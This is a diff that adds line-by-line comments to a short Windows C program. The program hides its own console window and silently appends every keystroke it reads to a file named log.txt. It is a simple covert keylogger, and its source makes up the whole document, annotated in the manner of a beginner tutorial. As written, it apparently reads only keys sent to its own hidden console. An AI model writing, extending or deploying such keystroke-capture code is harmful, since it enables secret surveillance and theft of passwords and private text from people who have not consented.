@@ -1,36 +1,37 @@
-#include <stdio.h>
-#include <conio.h>
+#include <stdio.h>                             //standard input output
+#include <conio.h>                             //for kbhit and getch
 
-#define _WIN32_WINNT 0x0500
-#include <windows.h>
+#define _WIN32_WINNT 0x0500                    //specifing windows version
+#include <windows.h>                           //for console control
 
-#define FILENAME "log.txt"
+#define FILENAME "log.txt"                     //destination file
 
-void logToFile(char *key)
+void logToFile(char *key)                      //function receives pointer to char
 {
-    FILE *f = fopen(FILENAME, "a");
+    FILE *f = fopen(FILENAME, "a");            //defines and opens stream
 
-    switch(*key)
+    switch(*key)                               //decides what to make with received char
     {
-        case 13: fprintf(f, "\n"); break;
-        case 27: exit(0);
-        default: fprintf(f, "%c", *key);
+        case 13: fprintf(f, "\n"); break;      //Breaks line on ENTER
+        case 27: exit(0);                      //Exits program on ESC
+        default: fprintf(f, "%c", *key);       //writes to file on deafult
     }
 }
-int main()
+
+int main()                                     //start point
 {
-    char key;
+    char key;                                  //char to be read
 
-    HWND console = GetConsoleWindow();
-    ShowWindow(console, SW_HIDE);
+    HWND console = GetConsoleWindow();         //gets console handle
+    ShowWindow(console, SW_HIDE);              //hides console
 
-    while(1)
+    while(1)                                   //infinite loop
     {
-        if(kbhit())
+        if(kbhit())                            //on key press
         {
-            key = getch();
-            logToFile(&key);
+            key = getch();                     //gets key
+            logToFile(&key);                   //calls function sending char's address
         }
     }
-    return 0;
+    return 0;                                  //exits
 }
